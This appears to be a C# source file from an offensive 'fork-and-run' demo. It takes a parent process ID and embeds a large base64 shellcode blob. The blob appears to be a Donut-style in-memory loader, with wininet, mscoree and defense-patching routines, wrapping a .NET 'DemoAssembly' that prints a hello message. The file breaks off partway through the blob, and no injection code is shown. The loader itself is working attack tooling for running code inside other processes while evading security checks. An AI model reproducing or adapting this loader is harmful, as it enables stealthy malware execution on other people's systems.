﻿using System;

namespace DemoApp
{
    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (!int.TryParse(args[0], out var ppid))
            {
                Console.WriteLine("Usage: DemoApp.exe <ppid>");
                return;
            }

            var shellcode = Convert.FromBase64String("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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwFwAAAAAAAAIAAAAAAAAAAQAAAHY0LjAuMzAzMTkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBQUFBQUFBQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIAAE1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwCAjhf/AAAAAAAAAADgACIACwEwAAAIAAAACAAAAAAAAEInAAAAIAAAAEAAAAAAQAAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAADvJgAATwAAAABAAADMBQAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAUCYAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAEgHAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAADMBQAAAEAAAAAGAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAABAAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAIycAAAAAAABIAAAAAgAFAGggAADoBQAAAQAAAAEAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AHIBAABwKA8AAAoAKiICKBAAAAoAKgBCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAADMAQAAI34AADgCAABcAgAAI1N0cmluZ3MAAAAAlAQAADQAAAAjVVMAyAQAABAAAAAjR1VJRAAAANgEAAAQAQAAI0Jsb2IAAAAAAAAAAgAAAUcVAAAJAAAAAPoBMwAWAAABAAAAEQAAAAIAAAACAAAAAQAAABAAAAAOAAAAAQAAAAEAAAAAAIoBAQAAAAAABgD/ABMCBgBsARMCBgAzAOEBDwAzAgAABgBbAMkBBgDiAMkBBgDDAMkBBgBTAckBBgAfAckBBgA4AckBBgByAMkBBgBHAPQBBgAlAPQBBgCmAMkBBgCNAJsBBgBHAr0BBgATAL0BAAAAAAEAAAAAAAEAAQAAABAAtQFOAkEAAQABAFAgAAAAAJEAxAEoAAEAXiAAAAAAhhjbAQYAAgAAAAEAQgIJANsBAQARANsBBgAZANsBCgApANsBEAAxANsBEAA5ANsBEABBANsBEABJANsBEABRANsBEABZANsBEABhANsBFQBpANsBEABxANsBEAB5ANsBEACJABsAGgCBANsBBgAuAAsALgAuABMANwAuABsAVgAuACMAXwAuACsAcQAuADMAcQAuADsAcQAuAEMAXwAuAEsAdwAuAFMAcQAuAFsAcQAuAGMAjwAuAGsAuQAuAHMAxgAEgAAAAQAAAAAAAAAAAAAAAABOAgAABAAAAAAAAAAAAAAAHwAKAAAAAAAAAAAAADxNb2R1bGU+AG1zY29ybGliAENvbnNvbGUAV3JpdGVMaW5lAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAERlbW9Bc3NlbWJseS5leGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBQcm9ncmFtAFN5c3RlbQBNYWluAFN5c3RlbS5SZWZsZWN0aW9uAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJT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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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